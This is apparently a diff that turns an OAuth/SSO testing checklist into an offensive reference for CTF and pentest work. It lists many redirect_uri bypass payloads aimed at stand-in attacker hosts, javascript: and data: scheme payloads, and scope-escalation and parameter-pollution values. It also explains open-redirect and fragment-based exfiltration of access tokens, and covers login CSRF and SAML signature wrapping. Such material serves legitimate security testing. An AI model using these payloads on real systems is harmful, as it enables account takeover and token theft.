@@ -1,85 +1,150 @@
-# OAuth / SSO Flow Issues
+# OAuth / SSO flow — the redirect, state, and token surface
 
-## Common OAuth 2.0 Roles to Identify
-```
-Resource Owner  → the user
-Client          → the application requesting access (target app)
-Authorization Server → issues tokens (e.g. Google, Okta, custom IdP)
-Resource Server → hosts protected resources
-```
+OAuth failures are flow bugs, not crypto bugs. The three stages —
+`/authorize` → redirect → `/callback` (+ `/token`) — each has a checklist.
 
-## State Parameter (CSRF Protection)
-```
-[ ] Is "state" parameter present in the authorization request?
-[ ] Is it validated on callback (matches what was sent)?
-[ ] Is it tied to the user's session, or is it static/predictable?
+---
 
-Test: remove or reuse an old "state" value on the callback URL and see if
-the flow still completes — indicates missing CSRF protection on the OAuth
-flow, allowing login CSRF or account linking attacks.
+## 1. The flow map
+
+```
+client → GET idp/authorize?client_id&redirect_uri&response_type&scope&state&nonce
+       → idp authenticates user → 302 redirect_uri?code=|token=|&state=
+client → POST idp/token {code, client_id, client_secret, redirect_uri, grant_type}
+       → access_token (+ id_token for OIDC)
+client → GET api/me with Bearer token
 ```
 
-## Redirect URI Validation
-```
-[ ] Does the authorization server validate redirect_uri strictly (exact
-    match) or loosely (prefix match, wildcard, any subdomain)?
+## 2. `redirect_uri` validation — the account-takeover primitive
 
-Test variations:
-https://target.com/callback          (legitimate)
-https://target.com/callback/../evil  (path traversal)
-https://target.com.attacker.com/callback   (subdomain confusion)
-https://target.com@attacker.com/callback   (userinfo confusion)
-https://target.com%2f@attacker.com/callback
+The code/token goes wherever `redirect_uri` points. Tests, cheapest first:
 
-If a loosely-validated redirect_uri is accepted, authorization codes/tokens
-can be exfiltrated to attacker-controlled endpoints.
 ```
-
-## Authorization Code Interception
-```
-[ ] Is PKCE (Proof Key for Code Exchange) used? If not, and the client is
-    public (mobile/SPA), authorization code interception is easier.
-[ ] Is the authorization code single-use and short-lived?
-[ ] Is the code bound to the redirect_uri used in the initial request?
-```
-
-## Token Leakage via Referer
-```
-[ ] After redirect back to the client with token/code in URL, does the
-    page load any third-party resources (analytics, ads, fonts)? If so,
-    the Referer header may leak the token/code to that third party.
+redirect_uri=https://attacker.tld/cb                    # open
+redirect_uri=https://attacker.tld                       # exact-diff
+redirect_uri=https://target.tld.attacker.tld/cb         # suffix
+redirect_uri=https://target.attacker.tld/cb             # subdomain trick
+redirect_uri=https://target.tld@attacker.tld/cb         # userinfo
+redirect_uri=https://attacker.tld?u=target.tld          # param confusion
+redirect_uri=https://target.tld/../..%2fattacker.tld    # traversal
+redirect_uri=https://target.tld%2f%2fattacker.tld       # double-slash
+redirect_uri=https%3a%2f%2fattacker.tld                 # encoded
+redirect_uri=https://target.tld%23.attacker.tld         # fragment-confuse
+redirect_uri=https://target.tld\.attacker.tld           # escaped dot
+redirect_uri=https://target.tld:attacker.tld            # port
+redirect_uri=javascript:alert(1)                        # scheme
+redirect_uri=data:text/html,<script>...</script>        # scheme
+redirect_uri=/%2f%2fattacker.tld                        # relative
+redirect_uri=//attacker.tld                             # protocol-relative
+redirect_uri=\\\\attacker.tld                           # backslash
+redirect_uri=/\\/attacker.tld
+redirect_uri=https:attacker.tld                          # missing //
+redirect_uri=https:///attacker.tld                      # empty host
+redirect_uri=https://target.tld.attacker.tld@evil.tld/  # host sandwich
+redirect_uri=https://attacker.tld/?next=https://target.tld/cb  # open-redirect chain
 ```
 
-## Account Linking / Confusion
-```
-[ ] If the app allows login via multiple providers (Google, Facebook,
-    email), does it link accounts based on unverified email claims?
-[ ] Can an attacker register with the target email at a less-trusted
-    provider (self-hosted OIDC, etc.) and log in as the victim if the
-    app trusts the email claim without verification?
+**The open-redirect chain**: find an open redirect *on* target.tld
+(`/r?url=`, `/go?to=`, `/redirect?next=`), set `redirect_uri` to it with
+`url=https://attacker.tld` — the IdP validates only the outer URI.
+
+**Fragment exfil**: if the server validates the host but the app then
+uses the fragment — `redirect_uri=https://target.tld/cb#@attacker.tld`
+or `?next=` inside the callback page — JS can read `location.hash`
+containing `access_token=` and forward it.
+
+## 3. `state` (CSRF) checks
+
+- `state` **absent**: the callback binds whatever account the IdP said to
+  whatever browser session arrives — **login CSRF**: attacker initiates
+  `/authorize` *as themselves*, gets `code_A`, drops it into victim's
+  `/callback` → victim's browser session is now logged in *as the
+  attacker's IdP account* — the victim's actions land in the attacker's
+  account; if the app merges profiles, the attacker's account now holds
+  victim data.
+- `state` present but not validated → same.
+- `state` predictable / reused.
+- `state` checked on some clients but not the mobile/alt one.
+
+```bash
+python3 tools/web/http_probe.py --challenge "$C" --class web-auth-session \
+  --url "$BASE/oauth/callback?code=AAAA&state=" \
+  --evidence-regex 'Set-Cookie|session' --evidence-kind impact \
+  --on-match confirms --on-miss inconclusive
 ```
 
-## Implicit Flow Risks (Legacy, Should Be Deprecated)
+## 4. `response_type` confusions
+
+| Asked | Got | Bug |
+|---|---|---|
+| `code` | also `token` | app accepts implicit when it meant code |
+| `token` (implicit) | `access_token` in `Location` fragment | token-in-URL leaks via Referer/history |
+| `id_token` | unsigned id_token | claims unverified — forge sub/email |
+| `code id_token` / `code token` | hybrid | downgrade to implicit |
+| `none` | no response | DoS/fingerprint |
+
+Implicit-flow tokens live in the fragment — but the *referer* on the
+`/callback` page's subresources can carry the fragment when the page does
+`location.replace(newUrl + location.hash)` or similar.
+
+## 5. `scope` escalation
+
 ```
-[ ] Is the implicit flow (response_type=token) still supported?
-[ ] Does it expose the access token directly in the URL fragment,
-    increasing exposure via browser history, logs, Referer?
+scope=openid profile email admin            # just ask
+scope=* / scope=admin                       # wildcard
+scope=read write                            # over-request
+scope=openid+profile+email+admin            # plus-encoding
+scope=openid%20profile%20admin              # url-encoded
+scope=["openid","admin"]                    # JSON array where string expected
+scope=openid&scope=admin                    # param pollution
 ```
 
-## Scope Escalation
-```
-[ ] Can the "scope" parameter be modified by the client to request
-    broader permissions than intended, if the authorization server doesn't
-    enforce a maximum per-client scope?
-```
+If the consent screen is skipped for `prompt=none` or pre-authorized
+clients, over-scoped tokens are minted silently.
 
-## Testing Checklist Summary
-```
-[ ] state parameter present, validated, session-bound
-[ ] redirect_uri validated with exact match, no open redirect
-[ ] PKCE used for public clients
-[ ] authorization code single-use, short expiry, bound to redirect_uri
-[ ] no token/code leakage via Referer to third-party resources
-[ ] account linking verifies email ownership, doesn't trust unverified claims
-[ ] scope parameter cannot be escalated beyond client's registered scopes
-```
+## 6. `client_id` / `client_secret`
+
+- `client_secret` in the SPA bundle / `git log` / `.env` → impersonate
+  the client.
+- `client_id` allowlist is per-redirect-uri — a *different* registered
+  client may have a looser redirect pattern.
+- `client_id` collision across providers (GitHub vs Google) → token
+  replay across providers.
+
+## 7. Token-side bugs
+
+- `access_token` is a JWT → `jwt-deep.md` (alg confusion, weak secret,
+  kid/jku).
+- `id_token` verified for signature but not `aud` → token minted for
+  another client accepted.
+- `id_token` not verified at all — `decode()` only.
+- `nonce` missing in the request but required — replay an id_token.
+- Token validated for the wrong provider (Google token accepted where
+  GitHub was expected) — cross-IdP confusion.
+
+## 8. SAML — the XML surface
+
+- Signature wrapping: signed `<Assertion>` alongside an unsigned evil
+  one; the app reads the unsigned.
+- `xmlsec` DTD → XXE (route `web-xxe`).
+- `Recipient`/`Audience`/`InResponseTo`/`NotOnOrAfter` missing checks →
+  token replay or cross-SP.
+- `NameID` accepted without signature verification (dev mode).
+- Response signed but Assertion unsigned (or vice versa).
+
+## 9. CTF shapes
+
+- The IdP is a mini service in the handout — read `authorize`/`token`
+  handlers; the bug is usually in `redirect_uri` comparison code:
+  `startswith`, `endswith`, `in`, or a regex with an unescaped `.`
+- `state` is echoed but never stored server-side.
+- `code` is single-use but **the token endpoint binds it to the wrong
+  `client_id`** — replay a leaked code with your own client.
+- The callback accepts `?access_token=` directly on GET (implicit
+  through the back door).
+
+## 10. Cross-links
+
+- Open redirect for the `redirect_uri` chain → `skills/web-open-redirect/`
+- JWT in `id_token`/`access_token` → `jwt-deep.md`
+- The whole flow when the IdP is the challenge → `skills/web-oauth-sso/`
